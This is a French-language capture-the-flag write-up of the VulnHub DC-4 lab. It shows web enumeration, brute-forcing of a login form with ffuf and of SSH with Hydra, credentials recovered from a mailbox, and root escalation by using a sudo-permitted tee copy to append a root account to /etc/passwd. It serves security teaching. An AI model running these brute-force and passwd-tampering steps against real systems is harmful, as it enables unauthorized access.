---
title: "Solution du CTF DC: 4 de VulnHub"
tags: [VulnHub, CTF]
---

Suite de mes aventures avec [le quatrième épisode du CTF DC](https://vulnhub.com/entry/dc-4,313/).

## Because I'm happy

Un Nmap remonte deux ports ouverts : le port 80 (Nginx) et 22 (SSH). Sur le serveur web se trouve une page d'index custom. Une énumération web avec `feroxbuster` remonte quelques scripts :

```
301        7l       11w      170c http://192.168.56.133/images
200       23l       40w        0c http://192.168.56.133/index.php
302       10l       13w        0c http://192.168.56.133/logout.php
301        7l       11w      170c http://192.168.56.133/css
302       15l       17w        0c http://192.168.56.133/login.php
200       23l       40w        0c http://192.168.56.133/
302       25l       67w        0c http://192.168.56.133/command.php
403        1l        2w        0c http://192.168.56.133/.PHP
403        1l        2w        0c http://192.168.56.133/.Php
```

On note que malgré la présence d'un code 302 certaines pages retournent du contenu :

```html
$ curl -D- http://192.168.56.133/command.php
HTTP/1.1 302 Found
Server: nginx/1.15.10
Date: Tue, 21 Mar 2023 14:34:33 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: PHPSESSID=namcus4t1dn9rtu9om5hs0gec4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php

<html>
<head>
<title>System Tools - Command</title>
<link rel="stylesheet" href="css/styles.css">
</head>

<body>
        <div class="container">
                <div class="inner">


                        <form method="post" action="command.php">
                                <strong>Run Command:</strong><br>
                                <input type="radio" name="radio" value="ls -l" checked="checked">List Files<br />
                                <input type="radio" name="radio" value="du -h">Disk Usage<br />
                                <input type="radio" name="radio" value="df -h">Disk Free<br />
                                <p>
                                <input type="submit" name="submit" value="Run">
                        </form>

                        You need to be logged in to use this system.<p><a href='index.php'>Click to Log In Again</a>
                </div>
        </div>
</body>
</html>
```

Forcément on se dit que l'authentification peut être bypassée et on tente de soumettre le formulaire tel quel :

```bash
curl -D- http://192.168.56.133/command.php -XPOST --data "radio=ls+-l&submit=Run" --referer http://192.168.56.133/command.php
```

Mais je n'obtiens pas l'exécution de commande espérée. C'est donc parti pour une attaque brute-force. La page d'index indique qu'il s'agit d'une zone d'administration. Tentons donc avec le compte `admin` :

```console
$ ffuf -X POST -u 'http://192.168.56.133/login.php' -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w rockyou.txt  -fs 206

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.133/login.php
 :: Wordlist         : FUZZ: rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 206
________________________________________________

happy                   [Status: 302, Size: 367, Words: 16, Lines: 16]
```

## Password in a box

On trouve trois utilisateurs sur le système, mais seul `Jim` a vraiment des fichiers :

```
./charles:
total 20K
drwxr-xr-x 2 charles charles 4.0K Apr  7  2019 .
drwxr-xr-x 5 root    root    4.0K Apr  7  2019 ..
-rw-r--r-- 1 charles charles  220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 charles charles 3.5K Apr  6  2019 .bashrc
-rw-r--r-- 1 charles charles  675 Apr  6  2019 .profile

./jim:
total 32K
drwxr-xr-x 3 jim  jim  4.0K Apr  7  2019 .
drwxr-xr-x 5 root root 4.0K Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3.5K Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4.0K Apr  7  2019 backups
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh

./jim/backups:
total 12K
drwxr-xr-x 2 jim jim 4.0K Apr  7  2019 .
drwxr-xr-x 3 jim jim 4.0K Apr  7  2019 ..
-rw-r--r-- 1 jim jim 2.0K Apr  7  2019 old-passwords.bak

./sam:
total 20K
drwxr-xr-x 2 sam  sam  4.0K Apr  7  2019 .
drwxr-xr-x 5 root root 4.0K Apr  7  2019 ..
-rw-r--r-- 1 sam  sam   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 sam  sam  3.5K Apr  6  2019 .bashrc
-rw-r--r-- 1 sam  sam   675 Apr  6  2019 .profile
```

Le fichier `test.sh` est un script shell donc le setuid bit ne s'applique pas. En revanche dans son dossier `backups` on trouve une wordlist que l'on s'empresse de récupérer pour la passer à `Hydra` :

```console
$ hydra -l jim -P /tmp/old-passwords.bak ssh://192.168.56.133
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-21 13:49:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 252 login tries (l:1/p:252), ~16 tries per task
[DATA] attacking ssh://192.168.56.133:22/
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 87 to do in 00:01h, 15 active
[22][ssh] host: 192.168.56.133   login: jim   password: jibril04
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-21 13:51:14
```

Avec ce mot de passe, on peut se connecter via SSH en tant que `Jim` et lire le fichier `mbox` qui nous était précédemment inaccessible.

```
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
        (envelope-from <root@dc-4>)
        id 1hCiQe-0000gc-EC
        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.
```

Cet email n'a rien d'intéressant, mais nous dirige dans la bonne direction : en effet l'utilisateur a des emails dans sa boîte normale.

```console
jim@dc-4:~$ mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/jim": 1 message 1 unread
>U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays
& 1
Message 1:
From charles@dc-4 Sat Apr 06 21:15:46 2019
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles

& q
Saved 1 message in /home/jim/mbox
```

On peut donc devenir `Charles` (via `su` ou SSH). L'utilisateur peut exécuter le binaire `/usr/bin/teehee` (qui n'est rien de plus que la commande `tee`) en root.

```console
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

On va l'utiliser pour rajouter une ligne au fichier `/etc/passwd`. Ici un account privilégié nommé `devloop` et avec le mot de passe `hello`.

Attention de ne pas oublier l'option `-a` pour le mode `append` sans quoi vous poutrez le système (un moment d'égarement est vite arrivé 😅).

```console
charles@dc-4:~$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh | sudo /usr/bin/teehee -a /etc/passwd
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
charles@dc-4:~$ tail /etc/passwd
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:109::/var/run/dbus:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
Debian-exim:x:108:112::/var/spool/exim4:/bin/false
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
charles@dc-4:~$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag.txt
# cat flag.txt



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
